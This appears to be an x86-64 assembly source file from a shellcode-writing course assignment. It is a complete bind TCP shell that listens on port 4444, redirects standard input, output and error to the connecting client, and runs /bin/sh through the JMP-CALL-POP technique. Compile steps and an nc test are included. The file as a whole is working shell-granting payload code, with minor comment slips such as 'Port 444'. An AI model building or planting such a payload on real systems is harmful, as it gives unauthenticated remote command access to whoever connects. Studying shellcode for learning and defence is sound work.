; Author: Guillem Alminyana
; 
; Bind TCP Shell using JMP-CALL-POP for Execve
;
; !! This code is one of the versions created for the Assignment1
;    But was finally discarded for finall shellcode size !! 
;  However, nice to review this code for learning purposes
;
; Compile:
;	nasm -f elf64 file.nasm -o file.o
;	ld -N file.o -o file
; Test:
;	run ./file
;	connect from another terminal with nc localhost 4444
;

%define AF_INET 2
%define SOCK_STREAM 1
%define INADDR_ANY 0
%define PORT 0x5c11			; Port 444 (htons(4444))

global _start

section .text

_start:

real_start:
	; sock = socket(AF_INET, SOCK_STREAM, 0)
	mov rax, 41			; syscall number
	mov rdi, AF_INET
	mov rsi, SOCK_STREAM
	mov rdx, 0
	syscall

	; Save the socket_id value in RDI for future use
	mov rdi, rax 			; value returned in RAX by syscall

	; Prepare (struct sockaddr *)&server
	;	RSP will point to the struct address
	xor rax, rax
 	push rax			; bzero(&server.sin_zero, 8)

	mov dword [rsp - 4], INADDR_ANY

	mov word [rsp - 6], PORT

	mov word [rsp - 8], AF_INET

	sub rsp, 8 			; Update RSP with right value
	
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	;	RDI already has the sock_id
	mov rax, 49			; syscall number
	mov rsi, rsp			; @ to (struct sockaddr * &server)
	mov rdx, 16			; length of the sockaddr struct
	syscall

	; listen(sock, MAX_CLIENTES
	;	RDI already has the sock_id
	mov rax, 50			; syscall number
	mov rsi, 2
	syscall

	; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
	; 	RDI already has the sock_id
	mov rax, 43			; syscall number
	
	; Reserve space on the stack for the struct (16 bytes)
	sub rsp, 16			; Reserved 16 bytes
	mov rsi, rsp			; RSI <- @ sockaddr struct

	; Store in the Stack the sockaddr_len value
	mov byte [rsp - 1], 16		; Stored the len (16 bytes)
	sub rsp, 1			; Update value for RSP
	mov rdx, rsp			; RDX <- @sockaddr_len
	syscall

	; Store the client socket descripion returned by accept
	mov r9, rax			; r9 <- client_sock

	; Close the parent socket_id
	mov rax, 3			; syscall number
	syscall				

	; Sockets duplication
	mov rdi, r9

	mov rax, 33			; syscall number
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall


	; JMP CALL POP Technique
	jmp shellcode

execve_start:

	; Execve SysCall for /bin/sh using relative addressing
	xor rax, rax

	; Get address of string SHELL
	pop rdi

	; Convert the "A" to a NULL
	mov [rdi + 7], byte al

	; Put @SHELL at the "BBBBBBBB"
	mov [rdi + 8], rdi

	; Copy NULLs to  the "CCCCCCCC"
	mov [rdi + 16], rax

	; RDX <- Address that stores address of the SHELL string	
	lea rsi, [rdi + 8]
	lea rdx, [rdi + 16]

	mov rax, 59			; syscall number
	syscall
	
shellcode:
	
	call execve_start
	SHELL: db "/bin/shABBBBBBBBCCCCCCCC"





























